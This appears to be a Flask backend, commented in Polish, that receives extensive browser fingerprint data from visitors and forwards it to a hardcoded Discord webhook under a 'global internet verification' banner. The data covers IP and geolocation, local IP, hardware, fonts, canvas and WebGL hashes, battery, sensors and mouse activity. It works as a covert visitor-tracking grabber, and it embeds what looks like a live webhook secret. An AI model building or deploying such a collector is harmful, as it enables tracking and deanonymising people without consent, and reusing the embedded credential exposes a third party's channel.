from flask import Flask, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

# Twój URL webhooka
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1528518546366136360/G_M-BUN3-QYO6OysKNaeuuHEGVqxsbqYP862p9eAdpWu2C9UQmdHFrMgHjsLLRbyKwcq"

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, ngrok-skip-browser-warning')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

def check_vpn(ip):
    try:
        # Render czasami przekazuje kilka IP, bierzemy pierwsze
        clean_ip = ip.split(',')[0].strip()
        r = requests.get(f'http://ip-api.com/json/{clean_ip}?fields=proxy,hosting,isp,org,country,city,mobile', timeout=3)
        if r.status_code == 200:
            return r.json(), clean_ip
    except:
        pass
    return None, ip

def shorten(value, max_len=80):
    if value is None: return 'no'
    s = str(value)
    return s[:max_len] + '...' if len(s) > max_len else s

@app.route('/collect', methods=['GET', 'POST', 'OPTIONS'])
def collect():
    if request.method == 'OPTIONS':
        return app.make_response(('ok', 200))

    # Na Renderze prawdziwe IP klienta siedzi w nagłówku 'X-Forwarded-For'
    ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
    vpn_info, client_ip = check_vpn(ip_raw)
    
    if request.method == 'POST':
        data = request.get_json() or {}
        
        if 'useragent' not in data:
            return jsonify({"status": "ok", "block": False}), 200

        log_lines = []
        log_lines.append("```diff")
        log_lines.append(f"======================================================================")
        log_lines.append(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] GLOBALNA WERYFIKACJA INTERNETU")
        log_lines.append(f"======================================================================")
        
        log_lines.append("\n📡 IP INFO:")
        log_lines.append(f"   IP Address   : {client_ip}")
        if vpn_info:
            log_lines.append(f"   Country      : {vpn_info.get('country')}")
            log_lines.append(f"   City         : {vpn_info.get('city')}")
            log_lines.append(f"   ISP          : {vpn_info.get('isp')}")
            log_lines.append(f"   Organization : {vpn_info.get('org')}")
            log_lines.append(f"   Proxy/VPN    : {'✅ YES' if vpn_info.get('proxy') else '❌ NO'}")
            log_lines.append(f"   Hosting/DC   : {'✅ YES' if vpn_info.get('hosting') else '❌ NO'}")
            
            if vpn_info.get('mobile') or vpn_info.get('proxy'):
                log_lines.append("⚠️ [BLOKADA] Wykryto połączenie mobilne (LTE/5G) lub VPN przez IP-API!")
        else:
            log_lines.append("   Brak danych IP (błąd API)")
        
        log_lines.append("\n📱 DEVICE INFO:")
        log_lines.append(f"   User-Agent   : {shorten(data.get('useragent'))}")
        log_lines.append(f"   Platform     : {data.get('platform', 'no')}")
        log_lines.append(f"   Screen       : {data.get('screen', 'no')}")
        log_lines.append(f"   Cores        : {data.get('cores', 'no')}")
        log_lines.append(f"   RAM          : {data.get('memory', 'no')} GB")
        log_lines.append(f"   Timezone     : {data.get('timezone', 'no')} (offset: {data.get('tzOffset', 'no')} min)")
        log_lines.append(f"   Language     : {data.get('language', 'no')}")
        
        network = data.get('network', {})
        log_lines.append("\n🌐 NETWORK:")
        if isinstance(network, dict):
            log_lines.append(f"   Type         : {network.get('type', 'no')}")
            log_lines.append(f"   Downlink     : {network.get('downlink', 'no')} Mbps")
            log_lines.append(f"   RTT          : {network.get('rtt', 'no')} ms")
        log_lines.append(f"   Local IP     : {data.get('localIP', 'no')}")
        
        sensors = data.get('sensors', {})
        log_lines.append("\n🔌 SENSORS:")
        log_lines.append(f"   Gyro         : {'✅' if sensors.get('gyro') else '❌'}")
        log_lines.append(f"   Accelerometer: {'✅' if sensors.get('accelerometer') else '❌'}")
        log_lines.append(f"   Orientation  : {'✅' if sensors.get('orientation') else '❌'}")
        
        battery = data.get('battery', {})
        log_lines.append("\n🔋 BATTERY:")
        if battery:
            log_lines.append(f"   Level        : {int(battery.get('level', 0) * 100)}%")
            log_lines.append(f"   Charging     : {'✅' if battery.get('charging') else '❌'}")
        else:
            log_lines.append("   Brak danych")
            
        plugins = data.get('plugins', [])
        log_lines.append("\n🛡️ ADBLOCK & PLUGINS:")
        log_lines.append(f"   AdBlock      : {'✅' if data.get('adblock') else '❌'}")
        log_lines.append(f"   Plugins      : {len(plugins) if isinstance(plugins, list) else 0} found")
        
        fonts = data.get('fonts', [])
        log_lines.append(f"\n🔤 FONTS: {len(fonts) if isinstance(fonts, list) else 0} found")
        if fonts and isinstance(fonts, list):
            log_lines.append(f"   {', '.join(fonts)}")
            
        webgl = data.get('webgl', {})
        log_lines.append("\n🎨 FINGERPRINT:")
        log_lines.append(f"   Canvas       : {shorten(data.get('canvas'), 50)}")
        if isinstance(webgl, dict):
            log_lines.append(f"   WebGL vendor : {webgl.get('vendor', 'no')}")
            log_lines.append(f"   WebGL render : {webgl.get('renderer', 'no')}")
        
        audio = data.get('audio', {})
        if isinstance(audio, dict):
            log_lines.append(f"   Audio sample : {audio.get('sampleRate', 'no')} Hz")
            
        behavior = data.get('behavior', {})
        log_lines.append("\n🖱️ BEHAVIOR:")
        if isinstance(behavior, dict):
            log_lines.append(f"   Clicks       : {behavior.get('clicks', 0)}")
            log_lines.append(f"   Mouse moves  : {behavior.get('moves', 0)}")
            
        log_lines.append("======================================================================```")
        
        discord_message = "\n".join(log_lines)
        
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"content": discord_message}, timeout=5)
        except Exception as e:
            print(f"Błąd Discorda: {e}")

        should_block = False
        if vpn_info and (vpn_info.get('mobile') or vpn_info.get('proxy')):
            should_block = True
            
        return jsonify({"status": "ok", "block": should_block}), 200

    return jsonify({"status": "ok", "block": False}), 200

@app.route('/')
def home():
    return "Bridge Operating 24/7", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
